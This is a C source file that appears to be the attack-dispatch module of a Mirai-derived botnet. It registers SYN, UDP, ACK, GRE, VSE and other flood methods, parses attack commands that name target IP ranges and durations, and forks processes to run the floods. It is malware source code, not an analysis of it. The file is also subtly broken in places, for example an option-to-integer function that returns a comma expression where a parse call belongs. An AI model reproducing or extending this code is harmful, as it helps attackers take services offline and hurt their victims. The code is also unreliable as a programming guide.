#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"


uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

int pid1, pid2;

BOOL attack_init(void)
{
    int i;

    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
    add_attack(ATK_VEC_UDP_FLOOD, (ATTACK_FUNC)attack_udp_thread);
    add_attack(ATK_VEC_NUDP, (ATTACK_FUNC)attack_method_nudp);
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
    add_attack(ATK_VEC_SACK2, (ATTACK_FUNC)attack_tcp_sack2);
    add_attack(ATK_VEC_STDHEX, (ATTACK_FUNC)attack_udp_stdhex);
    add_attack(ATK_VEC_STREAM, (ATTACK_FUNC)attack_tcpstream);
    add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_socket);
    add_attack(ATK_VEC_TCPWRA, (ATTACK_FUNC)attack_wraflood);

    return TRUE;
}

void attack_kill_all(void)
{
    int i;

#ifdef DEBUG
    printf("[attack] Killing all ongoing attacks\n");
#endif

    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
            kill(attack_ongoing[i], 9);
        attack_ongoing[i] = 0;
    }
}

int attack_parse(const unsigned char *buf, unsigned int len, struct Attack *attack) {
    unsigned int i = 0;

    // Read in attack duration uint32_t
    if (len < sizeof(uint32_t))
        return -1;
    attack->duration = ntohl(*((uint32_t *)buf));
    buf += sizeof(uint32_t);
    len -= sizeof(uint32_t);

    // Read in attack ID uint8_t
    if (len < sizeof(uint8_t))
        return -1;
    attack->vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof(uint8_t);

    // Read in target count uint8_t
    if (len < sizeof(uint8_t))
        return -1;
    attack->targs_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);
    if (attack->targs_len == 0)
        return -1;

    // Read in all targs
    if (len < ((sizeof(ipv4_t) + sizeof(uint8_t)) * attack->targs_len))
        return -1;
    attack->targs = calloc(attack->targs_len, sizeof(struct attack_target));
    if (attack->targs == NULL) return -1; // Check for calloc failure

    for (i = 0; i < attack->targs_len; i++) {
        attack->targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof(ipv4_t);
        attack->targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof(ipv4_t) + sizeof(uint8_t));

        attack->targs[i].sock_addr.sin_family = AF_INET;
        attack->targs[i].sock_addr.sin_addr.s_addr = attack->targs[i].addr;
    }

    // Read in flag count uint8_t
    if (len < sizeof(uint8_t))
        goto error;
    attack->opts_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);

    // Read in all opts
    if (attack->opts_len > 0) {
        attack->opts = calloc(attack->opts_len, sizeof(struct attack_option));
        if (attack->opts == NULL) return -1; // Check for calloc failure

        for (i = 0; i < attack->opts_len; i++) {
            uint8_t val_len;

            // Read in key uint8
            if (len < sizeof(uint8_t))
                goto error;
            attack->opts[i].key = (uint8_t)*buf++;
            len -= sizeof(uint8_t);

            // Read in data length uint8
            if (len < sizeof(uint8_t))
                goto error;
            val_len = (uint8_t)*buf++;
            len -= sizeof(uint8_t);

            if (len < val_len)
                goto error;
            attack->opts[i].val = calloc(val_len + 1, sizeof(char));
            if (attack->opts[i].val == NULL) return -1; // Check for calloc failure
            memcpy(attack->opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }

#ifdef DEBUG
    printf("[attack] launching attack ID: %d, duration: %d\n", attack->vector, attack->duration);
#endif

    return 0;

error:
    free(attack->targs);
    free_opts(attack->opts, attack->opts_len);
    return -1;
}


void attack_start(unsigned int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    pid1 = fork();
    if (pid1 == -1 || pid1 > 0)
        return;

    pid2 = fork();
    if (pid2 == -1)
        exit(0);

    else if (pid2 == 0)
    {
        sleep(duration);
        kill(getppid(), 9);
        exit(0);
    }
    else
    {
        int i = 0;
        for (i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)
            {
#ifdef DEBUG
                printf("[attack/init]: starting attack...\n");
#endif
                methods[i]->func(targs_len, targs, opts_len, opts);
                break;
            }
        }

        sleep(5);

        //just bail if the function returns
        exit(0);
    }
}

char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, unsigned char *def)
{
    unsigned int i;

    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }

    return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, unsigned int def)
{
    unsigned char *val = attack_get_opt_str(opts_len, opts, opt, NULL), *endptr;

    if (val == NULL)
        return def;
    else
        return (val, 10);// this is mirai problems again uh...
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    unsigned char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}

static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof (struct attack_method));

    method->vector = vector;
    method->func = func;

    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *));
    methods[methods_len++] = method;
}

void free_opts(struct attack_option *opts, unsigned int len)
{
    unsigned int i;

    if (opts == NULL)
        return;

    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}
